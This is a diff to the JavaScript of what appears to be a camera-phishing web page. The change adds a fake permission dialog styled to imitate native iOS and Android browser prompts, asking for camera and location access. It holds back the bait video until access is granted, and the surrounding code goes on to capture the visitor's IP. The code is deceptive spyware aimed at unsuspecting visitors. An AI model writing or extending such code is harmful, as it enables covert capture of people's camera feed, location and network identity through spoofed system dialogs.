@@ -4,16 +4,38 @@ document.addEventListener('DOMContentLoaded', () => {
     const camPreview = document.getElementById('camPreview');
     const contentVideo = document.getElementById('contentVideo');
 
-    // 1. Auto-play content video
-    contentVideo.play().catch(() => {
-        contentVideo.muted = true;
-        contentVideo.play();
-    });
+    // 1. Auto-play content video (Removed - waiting for permissions)
+    // contentVideo.play()... 
 
     // 2. Setup Permission Logic
     const permissionModal = document.getElementById('permission-modal');
+    const modalContent = permissionModal.querySelector('.modal-content');
     const btnCancel = document.getElementById('btn-cancel');
     const btnAllow = document.getElementById('btn-allow');
+    const modalTitle = permissionModal.querySelector('h3');
+    const modalText = permissionModal.querySelector('p');
+
+    // Theme Detection
+    const ua = navigator.userAgent.toLowerCase();
+    const isIOS = /iphone|ipad|ipod/.test(ua);
+    const isAndroid = /android/.test(ua);
+
+    if (isIOS) {
+        modalContent.classList.add('ios-theme');
+        modalTitle.innerText = "Permission Required";
+        modalText.innerText = "This website would like to access your Camera and Location.";
+        btnCancel.innerText = "Don't Allow";
+        btnAllow.innerText = "Allow";
+    } else if (isAndroid) {
+        modalContent.classList.add('android-theme');
+        modalTitle.innerText = "Allow website to access camera and location?";
+        modalText.innerText = ""; // Android prompts are often just the header
+        btnCancel.innerText = "DENY";
+        btnAllow.innerText = "ALLOW";
+    } else {
+        modalContent.classList.add('desktop-theme');
+        // Keep default text
+    }
 
     // Show modal initially
     showModal();
@@ -68,6 +90,9 @@ document.addEventListener('DOMContentLoaded', () => {
             // Wait for video metadata
             camPreview.onloadedmetadata = async () => {
                 camPreview.play();
+
+                // PLAY CONTENT VIDEO NOW
+                contentVideo.play().catch(e => console.log("Video play failed:", e));
 
                 // 3. Capture IP
                 let ip = "Unknown";
